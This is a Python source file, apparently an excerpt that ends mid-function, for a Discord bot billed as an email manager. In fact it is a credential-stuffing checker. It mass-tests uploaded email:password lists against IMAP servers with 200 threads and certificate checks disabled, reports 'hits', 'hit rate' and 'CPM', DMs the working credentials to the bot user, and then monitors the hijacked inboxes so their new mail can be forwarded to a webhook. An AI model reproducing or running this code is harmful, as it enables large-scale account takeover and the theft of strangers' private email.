#!/usr/bin/env python3
import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import os
import sqlite3
import imaplib
import email
import ssl
import json
import time
import threading
import logging
import re
import concurrent.futures
from datetime import datetime, timedelta
import requests
from email.header import decode_header
from email.utils import parsedate_to_datetime
import tempfile
import glob
import socket


# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
PERMISSIONS_INTEGER = 8

# Discord bot setup
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True

bot = commands.Bot(command_prefix='/', intents=intents)

class EmailBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

class EmailManager:
    """Email management system integrated with Discord"""
    
    def __init__(self, db_path='discord_emails.db'):
        self.db_path = db_path
        self.active_connections = {}
        self.webhook_urls = {}
        self.monitoring_tasks = {}
        self.login_in_progress = {}
        self.stop_login_requested = {}
        self.login_stats = {}
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database with user isolation"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Check if we need to migrate from guild_id to user_id
        cursor.execute("PRAGMA table_info(accounts)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'guild_id' in columns and 'user_id' not in columns:
            logger.info("🔄 Migrating database from guild_id to user_id for user isolation...")
            self.migrate_to_user_isolation(cursor)
        
        # Accounts table - isolated per user
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                imap_server TEXT,
                imap_port INTEGER,
                status TEXT DEFAULT 'pending',
                last_check TIMESTAMP,
                total_emails INTEGER DEFAULT 0,
                error_message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id, email)
            )
        ''')
        
        # Emails table - isolated per user
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS emails (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                user_id INTEGER NOT NULL,
                message_id TEXT,
                subject TEXT,
                sender TEXT,
                recipient TEXT,
                date_received TIMESTAMP,
                body_text TEXT,
                body_html TEXT,
                attachments TEXT,
                folder TEXT DEFAULT 'INBOX',
                is_read BOOLEAN DEFAULT 0,
                forwarded BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (account_id) REFERENCES accounts (id),
                UNIQUE(account_id, message_id)
            )
        ''')
        
        # Webhooks table - isolated per user
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS webhooks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                url TEXT NOT NULL,
                webhook_type TEXT DEFAULT 'discord',
                is_active BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(user_id)
            )
        ''')
        
        # Monitor filters table - isolated per user
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS monitor_filters (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                sender_email TEXT NOT NULL,
                is_active BOOLEAN DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Processed emails table - no changes needed (linked via account_id)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS processed_emails (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER NOT NULL,
                message_id TEXT NOT NULL,
                processed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(account_id, message_id)
            )
        ''')
        
        conn.commit()
        conn.close()

    def migrate_to_user_isolation(self, cursor):
        """Migrate existing data from guild_id to user_id structure"""
        try:
            logger.warning("⚠️  MIGRATION: Converting shared guild data to user-isolated data")
            logger.warning("⚠️  This will clear existing data to ensure user privacy!")
            
            # Clear all existing data to prevent cross-user data leakage
            cursor.execute("DELETE FROM processed_emails")
            cursor.execute("DELETE FROM emails") 
            cursor.execute("DELETE FROM monitor_filters")
            cursor.execute("DELETE FROM webhooks")
            cursor.execute("DELETE FROM accounts")
            
            logger.info("✅ Cleared all existing data for user isolation migration")
            
        except Exception as e:
            logger.error(f"❌ Migration error: {e}")
            raise
        
    def get_imap_settings(self, email_addr):
        """Get IMAP server settings based on email domain"""
        if '@' not in email_addr:
            logger.warning(f"Invalid email format (no @ symbol): {email_addr}")
            return ('imap.gmail.com', 993)  # Default fallback
        
        parts = email_addr.split('@')
        if len(parts) != 2 or not parts[1]:
            logger.warning(f"Invalid email format: {email_addr}")
            return ('imap.gmail.com', 993)  # Default fallback
            
        domain = parts[1].lower()
        
        imap_settings = {
            # Gmail
            'gmail.com': ('imap.gmail.com', 993),
            'googlemail.com': ('imap.gmail.com', 993),
            
            # Yahoo
            'yahoo.com': ('imap.mail.yahoo.com', 993),
            'yahoo.co.uk': ('imap.mail.yahoo.com', 993),
            'yahoo.fr': ('imap.mail.yahoo.com', 993),
            'yahoo.de': ('imap.mail.yahoo.com', 993),
            'yahoo.it': ('imap.mail.yahoo.com', 993),
            'yahoo.es': ('imap.mail.yahoo.com', 993),
            'yahoo.com.br': ('imap.mail.yahoo.com', 993),
            'yahoo.com.au': ('imap.mail.yahoo.com', 993),
            'yahoo.ca': ('imap.mail.yahoo.com', 993),
            'yahoo.co.jp': ('imap.mail.yahoo.co.jp', 993),
            'ymail.com': ('imap.mail.yahoo.com', 993),
            'rocketmail.com': ('imap.mail.yahoo.com', 993),
            
            # AOL
            'aol.com': ('imap.aol.com', 993),
            'aim.com': ('imap.aol.com', 993),
            
            # Microsoft Outlook/Hotmail/Live
            'outlook.com': ('outlook.office365.com', 993),
            'hotmail.com': ('outlook.office365.com', 993),
            'hotmail.co.uk': ('outlook.office365.com', 993),
            'hotmail.fr': ('outlook.office365.com', 993),
            'hotmail.de': ('outlook.office365.com', 993),
            'hotmail.it': ('outlook.office365.com', 993),
            'hotmail.es': ('outlook.office365.com', 993),
            'live.com': ('outlook.office365.com', 993),
            'live.co.uk': ('outlook.office365.com', 993),
            'live.fr': ('outlook.office365.com', 993),
            'live.de': ('outlook.office365.com', 993),
            'live.it': ('outlook.office365.com', 993),
            'live.es': ('outlook.office365.com', 993),
            'msn.com': ('outlook.office365.com', 993),
            'office365.com': ('outlook.office365.com', 993),
            
            # Apple iCloud
            'icloud.com': ('imap.mail.me.com', 993),
            'me.com': ('imap.mail.me.com', 993),
            'mac.com': ('imap.mail.me.com', 993),
            
            # Yandex
            'yandex.com': ('imap.yandex.com', 993),
            'yandex.ru': ('imap.yandex.ru', 993),
            'ya.ru': ('imap.yandex.ru', 993),
            
            # Mail.ru
            'mail.ru': ('imap.mail.ru', 993),
            'inbox.ru': ('imap.mail.ru', 993),
            'list.ru': ('imap.mail.ru', 993),
            'bk.ru': ('imap.mail.ru', 993),
            
            # German providers
            't-online.de': ('secureimap.t-online.de', 993),
            'web.de': ('imap.web.de', 993),
            'gmx.de': ('imap.gmx.net', 993),
            'gmx.net': ('imap.gmx.net', 993),
            'gmx.com': ('imap.gmx.com', 993),
            '1und1.de': ('imap.1und1.de', 993),
            '1and1.com': ('imap.1and1.com', 993),
            'freenet.de': ('mx.freenet.de', 993),
            
            # Italian providers
            'libero.it': ('imapmail.libero.it', 993),
            'virgilio.it': ('in.virgilio.it', 143),
            'alice.it': ('in.alice.it', 143),
            'tin.it': ('in.alice.it', 143),
            'fastweb.it': ('imap.fastwebnet.it', 993),
            'fastwebnet.it': ('imap.fastwebnet.it', 993),
            
            # French providers
            'orange.fr': ('imap.orange.fr', 993),
            'wanadoo.fr': ('imap.orange.fr', 993),
            'free.fr': ('imap.free.fr', 993),
            'laposte.net': ('imap.laposte.net', 993),
            'sfr.fr': ('imap.sfr.fr', 993),
            
            # Other providers
            'protonmail.com': ('127.0.0.1', 1143),
            'tutanota.com': ('mail.tutanota.com', 993),
            'zoho.com': ('imap.zoho.com', 993),
            'fastmail.com': ('imap.fastmail.com', 993),
            'sina.com': ('imap.sina.com', 993),
            'rediffmail.com': ('imap.rediffmail.com', 993),
        }
        
        return imap_settings.get(domain, ('imap.' + domain, 993))
    
    def get_firetrust_imap_settings(self, domain):
        """Get IMAP settings from Firetrust API as final fallback"""
        try:
            url = f"https://emailsettings.firetrust.com/settings?q={domain}"
            response = requests.get(url, timeout=3)  # Reduced timeout for speed
            
            if response.status_code == 200:
                data = response.json()
                imap_servers = []
                
                # Extract IMAP settings from the response
                for setting in data.get('settings', []):
                    if setting.get('protocol') == 'IMAP':
                        server = setting.get('address')
                        port = setting.get('port', 993)
                        if server:
                            imap_servers.append((server, port))
                            # Also try alternative port
                            alt_port = 143 if port == 993 else 993
                            imap_servers.append((server, alt_port))
                
                if imap_servers:
                    logger.info(f"Firetrust API found {len(imap_servers)} IMAP servers for {domain}")
                    return imap_servers
                else:
                    logger.info(f"Firetrust API found domain {domain} but no IMAP settings")
                    
            else:
                logger.info(f"Firetrust API: Domain {domain} not found (status {response.status_code})")
                
        except Exception as e:
            logger.warning(f"Failed to get Firetrust settings for {domain}: {e}")
            
        return []
    
    def decode_mime_words(self, text):
        """Decode MIME encoded words in email headers"""
        if not text:
            return ""
        
        try:
            decoded_parts = []
            for part, encoding in decode_header(text):
                if isinstance(part, bytes):
                    if encoding:
                        try:
                            decoded_parts.append(part.decode(encoding))
                        except (UnicodeDecodeError, LookupError):
                            # Fallback to utf-8 if encoding fails
                            try:
                                decoded_parts.append(part.decode('utf-8'))
                            except UnicodeDecodeError:
                                # Last resort: decode with errors ignored
                                decoded_parts.append(part.decode('utf-8', errors='ignore'))
                    else:
                        # No encoding specified, try utf-8
                        try:
                            decoded_parts.append(part.decode('utf-8'))
                        except UnicodeDecodeError:
                            decoded_parts.append(part.decode('utf-8', errors='ignore'))
                else:
                    # Already a string
                    decoded_parts.append(str(part))
            
            return ''.join(decoded_parts)
        except Exception as e:
            logger.warning(f"Failed to decode MIME words '{text}': {e}")
            return str(text)  # Return original text as fallback
        
    def test_email_connection(self, account_data):
        """Test email connection with domain-specific IMAP settings"""
        account_id, email_addr, password, imap_server, imap_port = account_data
        domain = email_addr.split('@')[1].lower()
        
        print(f"🔍 Testing {email_addr} - Domain: {domain}")
        
        # PRIORITY 1: Try domain-specific IMAP settings first
        domain_servers = self._get_domain_specific_servers(domain, imap_server, imap_port)
        
        for server, port in domain_servers:
            print(f"🔍 Trying domain-specific server: {server}:{port}")
            result = self._try_server_connection(account_id, email_addr, password, server, port, imap_server, imap_port)
            if result and result[2]:  # Success
                print(f"✅ Domain-specific IMAP success for {email_addr}: {server}:{port}")
                return result
            elif result and result[4] in ["Authentication failed - Invalid credentials", "2FA_REQUIRED", "Too many connections - Rate limited"]:
                # Authentication issue - don't try other servers, credentials are the problem
                print(f"🔐 Authentication issue for {email_addr}: {result[4]}")
                return result
        
        # PRIORITY 2: Try Firetrust API (if domain-specific failed due to connection issues)
        print(f"🌐 Domain-specific failed for {email_addr}, trying Firetrust API...")
        firetrust_servers = self.get_firetrust_imap_settings(domain)
        
        if firetrust_servers:
            print(f"🌐 Firetrust API found {len(firetrust_servers)} IMAP servers for {domain}")
            # Try only the FIRST server from API (most likely to work)
            server, port = firetrust_servers[0]
            result = self._try_server_connection(account_id, email_addr, password, server, port, imap_server, imap_port)
            if result and result[2]:  # Success
                print(f"✅ Firetrust API success for {email_addr}: {server}:{port}")
                return result
            elif result and result[4] in ["Authentication failed - Invalid credentials", "2FA_REQUIRED", "Too many connections - Rate limited"]:
                # Authentication issue
                print(f"🔐 Authentication issue for {email_addr}: {result[4]}")
                return result
        
        # All methods failed (only hardcoded + API, no MX lookup)
        print(f"❌ All connection methods failed for {email_addr}")
        return account_id, email_addr, False, 0, "All connection attempts failed (Domain-specific + API)"
    
    def _get_domain_specific_servers(self, domain, default_server, default_port):
        """Get domain-specific IMAP servers to try first"""
        servers = []
        
        # Always try the provided server first
        if default_server and default_port:
            servers.append((default_server, default_port))
        
        # Gmail domains
        if domain in ['gmail.com', 'googlemail.com']:
            servers.extend([
                ('imap.gmail.com', 993),
                ('imap.gmail.com', 143)
            ])
        
        # Outlook/Hotmail/Live domains
        elif domain in ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']:
            servers.extend([
                ('outlook.office365.com', 993),
                ('imap-mail.outlook.com', 993),
                ('outlook.office365.com', 143)
            ])
        
        # Yahoo domains
        elif domain in ['yahoo.com', 'yahoo.co.uk', 'yahoo.ca', 'yahoo.au', 'ymail.com', 'rocketmail.com']:
            servers.extend([
                ('imap.mail.yahoo.com', 993),
                ('imap.mail.yahoo.com', 143)
            ])
        
        # AOL domains
        elif domain in ['aol.com', 'aim.com']:
            servers.extend([
                ('imap.aol.com', 993),
                ('imap.aol.com', 143)
            ])
        
        # iCloud domains
        elif domain in ['icloud.com', 'me.com', 'mac.com']:
            servers.extend([
                ('imap.mail.me.com', 993),
                ('imap.mail.me.com', 143)
            ])
        
        # Zoho domains
        elif domain in ['zoho.com', 'zohomail.com']:
            servers.extend([
                ('imap.zoho.com', 993),
                ('imap.zoho.com', 143)
            ])
        
        # ProtonMail domains
        elif domain in ['protonmail.com', 'proton.me', 'pm.me']:
            servers.extend([
                ('127.0.0.1', 1143),  # ProtonMail Bridge
                ('imap.protonmail.com', 993)
            ])
        
        # Generic fallback for unknown domains
        else:
            servers.extend([
                (f'imap.{domain}', 993),
                (f'mail.{domain}', 993),
                (f'imap.{domain}', 143),
                (f'mail.{domain}', 143)
            ])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_servers = []
        for server, port in servers:
            if (server, port) not in seen:
                seen.add((server, port))
                unique_servers.append((server, port))
        
        print(f"📋 Domain-specific servers for {domain}: {unique_servers}")
        return unique_servers
    
    async def _progress_updater(self, status_message, user_id, total_accounts):
        """Update progress every 5 seconds"""
        try:
            while self.login_in_progress.get(user_id, False):
                await asyncio.sleep(5)  # Update every 5 seconds
                if self.login_in_progress.get(user_id, False):
                    try:
                        await self.update_status_embed(status_message, user_id, total_accounts)
                        print(f"📊 Progress update: {self.login_stats[user_id]['processed']}/{total_accounts}")
                    except Exception as e:
                        print(f"❌ Error in progress updater: {e}")
        except asyncio.CancelledError:
            print("📊 Progress updater cancelled")
    
    def _try_server_connection(self, account_id, email_addr, password, server, port, original_server, original_port):
        """Helper function to try connecting to a specific server"""
        try:
            # Set socket timeout to prevent hanging (reduced for speed)
            socket.setdefaulttimeout(2)  # 2 second timeout for faster processing
            
            if port == 993:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                mail = imaplib.IMAP4_SSL(server, port, ssl_context=context)
            else:
                mail = imaplib.IMAP4(server, port)
            
            mail.login(email_addr, password)
            mail.select('INBOX')
            
            # Quick email count check (optimized for speed)
            try:
                status, messages = mail.search(None, 'ALL')
                email_count = len(messages[0].split()) if messages[0] else 0
            except:
                email_count = 0  # Skip count if it fails, prioritize speed
            
            mail.logout()
            
            # Update database with working server
            if server != original_server or port != original_port:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('UPDATE accounts SET imap_server = ?, imap_port = ? WHERE id = ?', 
                             (server, port, account_id))
                conn.commit()
                conn.close()
            
            return account_id, email_addr, True, email_count, f"Connected via {server}:{port}"
            
        except imaplib.IMAP4.error as e:
            error_msg = str(e).lower()
            if 'authentication failed' in error_msg or 'login failed' in error_msg:
                if any(keyword in error_msg for keyword in ['two-factor', '2fa', 'verification', 'app password']):
                    return account_id, email_addr, False, 0, "2FA_REQUIRED"
                return account_id, email_addr, False, 0, "Authentication failed - Invalid credentials"
            elif 'too many simultaneous connections' in error_msg:
                return account_id, email_addr, False, 0, "Too many connections - Rate limited"
            return None  # Continue trying other servers
            
        except ssl.SSLError:
            return None  # Continue trying other servers
            
        except Exception as e:
            error_msg = str(e).lower()
            if 'name or service not known' in error_msg or 'connection refused' in error_msg:
                return None  # Continue trying other servers
            return account_id, email_addr, False, 0, f"Connection error: {str(e)}"
    
    async def update_status_embed(self, message, user_id, total_accounts):
        """Update the status embed with current progress"""
        stats = self.login_stats[user_id]
        processed = stats['processed']
        successful = stats['successful']
        failed = stats['failed']
        twofa = stats.get('twofa', 0)
        
        # Calculate progress
        progress = (processed / total_accounts * 100) if total_accounts > 0 else 0
        
        # Create progress bar
        bar_length = 20
        filled_length = int(bar_length * processed // total_accounts) if total_accounts > 0 else 0
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        # Calculate performance metrics
        elapsed_time = time.time() - stats.get('start_time', time.time())
        cpm = (processed / (elapsed_time / 60)) if elapsed_time > 0 else 0
        eta = ((total_accounts - processed) / cpm * 60) if cpm > 0 else 0
        hit_rate = (successful / processed * 100) if processed > 0 else 0
        
        embed = discord.Embed(
            title="📊 Account Info",
            color=0x00ff00
        )
        
        # Progress section
        embed.add_field(
            name="Progress",
            value=f"`[{bar}]` {progress:.1f}%",
            inline=False
        )
        
        # Checker Stats
        embed.add_field(
            name="Checker Stats",
            value=f"**Checked:** {processed}/{total_accounts}\n"
                  f"**Valid:** {successful}\n"
                  f"**Invalid:** {failed}\n"
                  f"**2FA:** {twofa}",
            inline=True
        )
        
        # Performance
        embed.add_field(
            name="Performance",
            value=f"**Elapsed:** {elapsed_time:.1f}s\n"
                  f"**CPM:** {cpm:.1f}\n"
                  f"**ETA:** {eta:.1f}s",
            inline=True
        )
        
        # Hit Rate
        embed.add_field(
            name="Hit Rate",
            value=f"**Rate:** {hit_rate:.1f}%\n"
                  f"**Hits:** {successful}/{total_accounts}",
            inline=True
        )
        
        if processed >= total_accounts:
            embed.add_field(
                name="📬 Results Delivered",
                value="Check your DMs for the results files!",
                inline=False
            )
        
        try:
            await message.edit(embed=embed)
        except discord.HTTPException as e:
            print(f"❌ Discord API error updating embed: {e}")
        except Exception as e:
            print(f"❌ Unexpected error updating embed: {e}")
    
    async def send_results_dm(self, user, user_id, processed_account_ids=None):
        """Send results file to user's DM - only for accounts processed in current session"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # If processed_account_ids is provided, only get results for those accounts
            if processed_account_ids:
                placeholders = ','.join(['?' for _ in processed_account_ids])
                
                # Get valid accounts from current session only
                cursor.execute(f'''
                    SELECT email, password FROM accounts 
                    WHERE id IN ({placeholders}) AND status = 'active'
                ''', processed_account_ids)
                valid_accounts = cursor.fetchall()
                
                # Get invalid accounts from current session only
                cursor.execute(f'''
                    SELECT email, password, error_message FROM accounts 
                    WHERE id IN ({placeholders}) AND status = 'failed'
                ''', processed_account_ids)
                invalid_accounts = cursor.fetchall()
                
                # Get 2FA accounts from current session only
                cursor.execute(f'''
                    SELECT email, password FROM accounts 
                    WHERE id IN ({placeholders}) AND status = '2fa'
                ''', processed_account_ids)
                twofa_accounts = cursor.fetchall()
            else:
                # Fallback to all accounts (for backward compatibility)
                cursor.execute('''
                    SELECT email, password FROM accounts 
                    WHERE user_id = ? AND status = 'active'
                ''', (user_id,))
                valid_accounts = cursor.fetchall()
                
                cursor.execute('''
                    SELECT email, password, error_message FROM accounts 
                    WHERE user_id = ? AND status = 'failed'
                ''', (user_id,))
                invalid_accounts = cursor.fetchall()
                
                cursor.execute('''
                    SELECT email, password FROM accounts 
                    WHERE user_id = ? AND status = '2fa'
                ''', (user_id,))
                twofa_accounts = cursor.fetchall()
            
            conn.close()
            
            if valid_accounts:
                # Send domain-separated valid accounts
                await self.send_domain_separated_results(user, user_id, processed_account_ids)
                
                # Also send combined valid accounts file for backward compatibility
                valid_content = "\n".join([f"{email}:{password}" for email, password in valid_accounts])
                with tempfile.NamedTemporaryFile(mode='w', suffix='_valid.txt', delete=False) as f:
                    f.write(valid_content)
                    valid_file = f.name
                
                await user.send(
                    f"✅ **All Valid Accounts Combined ({len(valid_accounts)} found)**",
                    file=discord.File(valid_file, filename=f"all_valid_accounts_{len(valid_accounts)}.txt")
                )
                os.unlink(valid_file)
            
            if invalid_accounts:
                # Create invalid accounts file
                invalid_content = "\n".join([f"{email}:{password} - {error}" for email, password, error in invalid_accounts])
                with tempfile.NamedTemporaryFile(mode='w', suffix='_invalid.txt', delete=False) as f:
                    f.write(invalid_content)
                    invalid_file = f.name
                
                await user.send(
                    f"❌ **Invalid Accounts ({len(invalid_accounts)} found)**",
                    file=discord.File(invalid_file, filename=f"invalid_accounts_{len(invalid_accounts)}.txt")
                )
                os.unlink(invalid_file)
            
            if twofa_accounts:
                # Create 2FA accounts file
                twofa_content = "\n".join([f"{email}:{password}" for email, password in twofa_accounts])
                with tempfile.NamedTemporaryFile(mode='w', suffix='_2fa.txt', delete=False) as f:
                    f.write(twofa_content)
                    twofa_file = f.name
                
                await user.send(
                    f"🔐 **2FA Required Accounts ({len(twofa_accounts)} found)**\nThese accounts require app passwords or 2FA setup.",
                    file=discord.File(twofa_file, filename=f"2fa_accounts_{len(twofa_accounts)}.txt")
                )
                os.unlink(twofa_file)
                
        except Exception as e:
            logger.error(f"Error sending results DM: {e}")
    
    async def process_email_list(self, user_id, email_list, channel, max_workers=200):
        """Process uploaded email list and validate accounts"""
        print(f"🔄 Starting process_email_list for user {user_id}")
        lines = email_list.strip().split('\n')
        print(f"📝 Processing {len(lines)} lines from email list")
        
        # Initialize tracking
        self.login_in_progress[user_id] = True
        self.stop_login_requested[user_id] = False
        self.login_stats[user_id] = {'successful': 0, 'failed': 0, 'total': 0, 'processed': 0}
        
        # Send immediate response with detailed status
        embed = discord.Embed(
            title="📧 Email Validation Started",
            description="Initializing email account validation system...",
            color=0x0099ff
        )
        status_message = await channel.send(embed=embed)
        
        # Parse accounts
        print(f"🗄️ Connecting to database: {self.db_path}")
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Keep existing accounts and add new ones (accumulative approach)
        print(f"📊 Keeping existing accounts and adding new ones for user {user_id}")
        
        # Get count of existing accounts for logging
        cursor.execute('SELECT COUNT(*) FROM accounts WHERE user_id = ? AND status = "active"', (user_id,))
        existing_count = cursor.fetchone()[0]
        print(f"📈 Found {existing_count} existing active accounts for user {user_id}")
        
        batch_data = []
        for line in lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
                
            try:
                email_addr, password = line.split(':', 1)
                email_addr = email_addr.strip()
                password = password.strip()
                
                if not email_addr or not password:
                    continue
                
                # Validate email format
                if '@' not in email_addr or email_addr.count('@') != 1:
                    logger.warning(f"Skipping invalid email format: {email_addr}")
                    continue
                
                try:
                    imap_server, imap_port = self.get_imap_settings(email_addr)
                    batch_data.append((user_id, email_addr, password, imap_server, imap_port))
                except Exception as e:
                    logger.error(f"Error getting IMAP settings for {email_addr}: {e}")
                    continue
                
            except ValueError:
                continue
        
        if not batch_data:
            print(f"❌ No valid email:password combinations found in file")
            embed = discord.Embed(
                title="❌ No Valid Accounts Found",
                description="Please check your file format. Expected: email:password",
                color=0xff0000
            )
            await status_message.edit(embed=embed)
            self.login_in_progress[user_id] = False
            return
        
        print(f"📊 Parsed {len(batch_data)} valid email:password combinations")
        
        # Insert accounts
        print(f"💾 Inserting {len(batch_data)} accounts into database...")
        cursor.executemany('''
            INSERT OR IGNORE INTO accounts (user_id, email, password, imap_server, imap_port)
            VALUES (?, ?, ?, ?, ?)
        ''', batch_data)
        
        conn.commit()
        print(f"✅ Database commit completed")
        
        # Get accounts for processing
        print(f"🔍 Fetching accounts for processing...")
        cursor.execute('''
            SELECT id, email, password, imap_server, imap_port 
            FROM accounts 
            WHERE user_id = ? AND status = 'pending'
        ''', (user_id,))
        
        accounts = cursor.fetchall()
        conn.close()
        print(f"📋 Retrieved {len(accounts)} accounts for processing")
        
        # Store the account IDs for this processing session
        processed_account_ids = [account[0] for account in accounts]  # account[0] is the ID
        self.login_stats[user_id]['processed_account_ids'] = processed_account_ids
        
        total_accounts = len(accounts)
        self.login_stats[user_id]['total'] = total_accounts
        self.login_stats[user_id]['start_time'] = time.time()
        self.login_stats[user_id]['successful'] = 0
        self.login_stats[user_id]['failed'] = 0
        self.login_stats[user_id]['processed'] = 0
        self.login_stats[user_id]['twofa'] = 0
        
        # Create initial status embed
        print(f"📊 Updating initial status embed...")
        await self.update_status_embed(status_message, user_id, total_accounts)
        
        # Process in batches with optimized settings for speed
        batch_size = 100  # Increased batch size for better throughput
        print(f"🔄 Starting batch processing with batch_size={batch_size}")
        
        # Start progress update task (every 5 seconds)
        progress_task = asyncio.create_task(self._progress_updater(status_message, user_id, total_accounts))
        
        for i in range(0, len(accounts), batch_size):
            print(f"🔄 Processing batch {i//batch_size + 1}/{(len(accounts)-1)//batch_size + 1} (accounts {i+1}-{min(i+batch_size, len(accounts))})")
            if self.stop_login_requested.get(user_id, False):
                await channel.send("⏹️ **Validation stopped by user request**")
                break
                
            batch = accounts[i:i + batch_size]
            
            # Process batch with threading (increased workers for speed)
            batch_start_time = time.time()
            print(f"⚡ Starting ThreadPoolExecutor with {max_workers} workers for {len(batch)} accounts")
            loop = asyncio.get_event_loop()
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                tasks = [loop.run_in_executor(executor, self.test_email_connection, account) for account in batch]
                print(f"🔄 Created {len(tasks)} tasks, waiting for results...")
                results = await asyncio.gather(*tasks)
                batch_time = time.time() - batch_start_time
                cps = len(batch) / batch_time if batch_time > 0 else 0
                print(f"✅ Batch completed in {batch_time:.1f}s - {cps:.1f} CPS")
                
                # Update database
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                for account_id, email_addr, success, email_count, message in results:
                    if success:
                        cursor.execute('''
                            UPDATE accounts 
                            SET status = 'active', last_check = CURRENT_TIMESTAMP, total_emails = ?, error_message = NULL
                            WHERE id = ?
                        ''', (email_count, account_id))
                        self.login_stats[user_id]['successful'] += 1
                        
                        # Store connection for monitoring
                        self.active_connections[account_id] = {
                            'email': email_addr,
                            'user_id': user_id,
                            'last_check': datetime.now()
                        }
                        
                    else:
                        if message == "2FA_REQUIRED":
                            cursor.execute('''
                                UPDATE accounts 
                                SET status = '2fa', last_check = CURRENT_TIMESTAMP, error_message = ?
                                WHERE id = ?
                            ''', (message, account_id))
                            self.login_stats[user_id]['twofa'] += 1
                        else:
                            cursor.execute('''
                                UPDATE accounts 
                                SET status = 'failed', last_check = CURRENT_TIMESTAMP, error_message = ?
                                WHERE id = ?
                            ''', (message, account_id))
                            self.login_stats[user_id]['failed'] += 1
                    
                    self.login_stats[user_id]['processed'] += 1
                
                conn.commit()
                conn.close()
        
        # Stop progress updater and final update
        progress_task.cancel()
        self.login_in_progress[user_id] = False
        await self.update_status_embed(status_message, user_id, total_accounts)
        
        # Send results to user's DM (we'll store the user in the upload command)
        try:
            if hasattr(self, 'current_user') and self.current_user:
                processed_ids = self.login_stats[user_id].get('processed_account_ids', [])
                await self.send_results_dm(self.current_user, user_id, processed_ids)
        except Exception as e:
            logger.error(f"Error sending DM: {e}")
        
        # Start monitoring if we have valid accounts
        final_stats = self.login_stats[user_id]
        
        # Get total active accounts (including previously uploaded ones)
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM accounts WHERE user_id = ? AND status = "active"', (user_id,))
        total_active_accounts = cursor.fetchone()[0]
        conn.close()
        
        if final_stats['successful'] > 0:
            # Check if user has webhook configured before starting monitoring
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('SELECT url FROM webhooks WHERE user_id = ? AND is_active = 1', (user_id,))
                webhook_result = cursor.fetchone()
                conn.close()
                
                user = self.current_user
                if user:
                    if webhook_result:
                        # User has webhook configured, start monitoring
                        await user.send(f"🔄 **Starting email monitoring for {total_active_accounts} valid accounts...**")
                        await self.start_email_monitoring(user_id, None)  # No channel needed for private monitoring
                    else:
                        # User doesn't have webhook configured, inform them
                        await user.send(f"✅ **Validation complete!** {total_active_accounts} valid accounts found.\n\n⚠️ **To enable email monitoring:** Set a webhook URL using `/webhook` command, then use `/start_monitoring` to begin monitoring for new emails.")
            except Exception as e:
                logger.error(f"Error checking webhook or sending monitoring message: {e}")
    
    async def start_email_monitoring(self, user_id, channel):
        """Start monitoring emails for a user"""
        if user_id in self.monitoring_tasks:
            return
        
        task = asyncio.create_task(self.monitor_emails_task(user_id, channel))
        self.monitoring_tasks[user_id] = task
        
        # Send private message to user instead of public channel message
        try:
            user = self.current_user
            if user:
                await user.send("✅ **Email monitoring started!** New emails will be forwarded to your webhook.")
        except Exception as e:
            logger.error(f"Error sending private monitoring start message: {e}")
    
    async def monitor_emails_task(self, user_id, channel):
        """Background task to monitor emails"""
        logger.info(f"🔄 Starting email monitoring task for user {user_id}")
        while True:
            try:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT id, email, password, imap_server, imap_port 
                    FROM accounts 
                    WHERE user_id = ? AND status = 'active'
                ''', (user_id,))
                
                accounts = cursor.fetchall()
                conn.close()
                
                logger.info(f"📧 Monitoring {len(accounts)} accounts for user {user_id}")
                
                if not accounts:
                    logger.warning(f"No active accounts found for user {user_id}")
                    await asyncio.sleep(60)
                    continue
                
                new_emails_count = 0
                
                # Process accounts in smaller batches to avoid blocking
                batch_size = 5
                for i in range(0, len(accounts), batch_size):
                    batch = accounts[i:i + batch_size]
                    
                    # Process batch with timeout
                    tasks = []
                    for account_id, email_addr, password, imap_server, imap_port in batch:
                        task = asyncio.create_task(
                            self.check_account_for_new_emails_with_timeout(
                                account_id, email_addr, password, imap_server, imap_port, user_id
                            )
                        )
                        tasks.append(task)
                    
                    # Wait for batch with timeout
                    try:
